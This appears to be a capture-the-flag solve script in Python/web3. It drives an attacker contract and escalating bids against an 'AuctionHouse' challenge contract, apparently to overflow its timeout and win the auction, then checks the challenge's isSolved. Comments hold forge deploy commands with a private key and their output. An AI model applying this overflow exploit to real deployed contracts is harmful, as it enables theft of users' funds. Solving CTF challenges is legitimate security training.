from web3 import Web3
import json
from web3.gas_strategies.rpc import rpc_gas_price_strategy
from solcx import compile_source, install_solc, compile_files

x = {
    "PrivateKey": "0x50086d6229b0adf8b45efe6a868f21335b3dc83adbb58a7e6cdb6540b6c2aee3",
    "Address": "0x5B0ab4c26cCF17032607C3a8be251de0341eeEcd",
    "TargetAddress": "0xA735e8f54a61031b17A2a855cB14c7C1fd298f6D",
    "setupAddress": "0x859D696A3f612AC1FfFDfaDF7eC2256067AeE170"
}

PrivateKey =    x["PrivateKey"]
Address =       x["Address"] 
TargetContract = x["TargetAddress"]
SetupContract =  x["setupAddress"]

Target2Contract = "0x0B8d82e912Cd7EDC5Bd3C5Ab5F4e1ae41021c349"

url = 'http://167.172.62.51:30595/rpc'

YEAR = 31556926

w3 = Web3(Web3.HTTPProvider(url))
block_number = w3.eth.block_number
timeout0 = w3.eth.get_block(block_number).timestamp
print(block_number)
print(timeout0)

timegap = 2**32 - timeout0
print(f'Time gap: {timegap}')
adjust = 5
index = timegap//YEAR + adjust
print(f'Gap counter: {index}')

account_address = Address
balance = w3.eth.get_balance(account_address)
print(balance)

install_solc("0.7.0")

compiled = compile_files(["Contract.sol"], output_values=["abi"], solc_version="0.7.0")
abi_contract = compiled['Contract.sol:Contract']['abi']

compiled = compile_files(["AuctionHouse.sol"], output_values=["abi"], solc_version="0.7.0")
abi = compiled['AuctionHouse.sol:AuctionHouse']['abi']
contract_instance = w3.eth.contract(address=TargetContract, abi=abi)

addr = Address
target = TargetContract

contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi_contract)

value = 500000000000000000
for i in range(index//2 + 1):
	value = 2*value + 1	
	contract_instance2.functions.attack2(value).transact()
	
	print(f'{i}-1')
	print(f'value = {value}')
	print(contract_instance.functions.topBidder().call())
	print(contract_instance.functions.timeout().call())

	value = 2*value + 1	
	w3.eth.send_transaction({"from":addr, "to":target,"value":value,})
	#w3.eth.call({"to":target,"value":value,})

	print(f'{i}-2')
	print(f'value = {value}')
	print(contract_instance.functions.topBidder().call())
	print(contract_instance.functions.timeout().call())

#contract_instance.functions.claimPrize().transact()

compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.7.0")
abi = compiled['Setup.sol:Setup']['abi']

contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
number = contract_instance.functions.isSolved(account_address).call()

print(f'The current number stored is: { number } ')
#

'''
https://ctftime.org/writeup/31583
https://0xsage.medium.com/ethernaut-lvl-4-walkthrough-how-to-abuse-tx-origin-msg-sender-ef37d6751c8

forge init . --no-git

forge create src/Contract.sol:Contract --rpc-url http://209.97.176.174:31323/rpc --private-key 0x643f9dae7f3636d00fddb4236351c6136001b2cb5641b49ea1f72c327e5f1981
[⠰] Compiling...
[⠔] Compiling 1 files with 0.8.20
[⠒] Solc 0.8.20 finished in 40.18ms
Compiler run successful!
Deployer: 0xd44C694e6280032dA55cEF6715aA3d89c1AD4836
Deployed to: 0x855ad55752bCE030B8D8875d671494eE3F51B1e7
Transaction hash: 0xfcbc1aca59dc9b42ce5c917c38d28b7ba60488ab115b25aa9c425ac6513709e0


Change the address in Contract.sol, align with TargetAddress in rpc url
Change the address in dec.py, align with the new deplyed address by forge

'''
